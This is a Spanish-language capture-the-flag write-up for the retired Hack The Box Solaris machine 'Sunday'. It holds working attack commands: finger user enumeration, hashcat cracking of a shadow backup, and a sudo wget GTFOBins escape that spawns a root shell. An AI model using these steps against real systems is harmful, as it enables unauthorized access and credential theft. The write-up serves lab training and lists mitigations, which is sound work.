---
machine: Sunday
os: Solaris
difficulty: Easy
platform: Hack The Box
category: Servicios / Solaris
state: Retired
tags: [solaris, finger, ssh, shadow, hashcat, sudo, wget, gtfobins]
---

# Sunday — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

Solaris con **finger** expuesto: enumera `sunny` y `sammy`. `sunny` tiene una contraseña trivial y, desde su home, se llega a un **backup de `/etc/shadow`**; el hash de `sammy` cae con diccionario. `sammy` puede ejecutar **`wget` como root** con `sudo`, y eso permite escribir donde haga falta (o usar el `--use-askpass` de GTFOBins).

## Reconocimiento

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
79/tcp    open  finger   Sun Solaris fingerd
111/tcp   open  rpcbind
22022/tcp open  ssh      SunSSH 1.3
```

```bash
finger-user-enum -U /usr/share/seclists/Usernames/Names/names.txt -t <IP>
# sammy, sunny
```

## Acceso

1. **`sunny`**: contraseña del propio nombre de la máquina; el SSH va en el 22022 y necesita algoritmos antiguos.

```bash
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -p 22022 sunny@<IP>
```

2. **Backup de `shadow`** en el home: el hash de `sammy` es SHA-256 crypt (`$5$`).

```bash
hashcat -m 7400 hash.txt /usr/share/wordlists/rockyou.txt
```

3. **SSH como `sammy`** con la contraseña recuperada.

## Escalada

```bash
sudo -l
```

```text
User sunny may run the following commands on this host:
    (root) NOPASSWD: /root/troll        # imprime "testing" y el id: señuelo
User sammy may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/wget
```

`wget` como root escribe donde se le pida; la vía limpia es el escape de GTFOBins:

```bash
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh\n/bin/sh 1>&0' > $TF
sudo /usr/bin/wget --use-askpass=$TF 0
```

```text
root@sunday:~# id
uid=0(root)
```

## Tropiezos

- **`/root/troll`**: es una broma; no lleva a root.
- **SSH antiguo**: sin `KexAlgorithms` modernos el cliente rechaza la conexión.
- **`wget` con `-i`**: leer `/etc/shadow` sólo sirve si se puede volcar; lo útil es **escribir** (`-O`) o el `askpass`.

## Lecciones

- `finger` filtra usuarios válidos: enumeración gratuita.
- Un backup de `shadow` en un home convierte un usuario en dos.
- `sudo` sobre `wget` es escritura arbitraria como root.
- Mitigación: deshabilitar `finger`, contraseñas fuertes, y `sudo` sin descargadores.
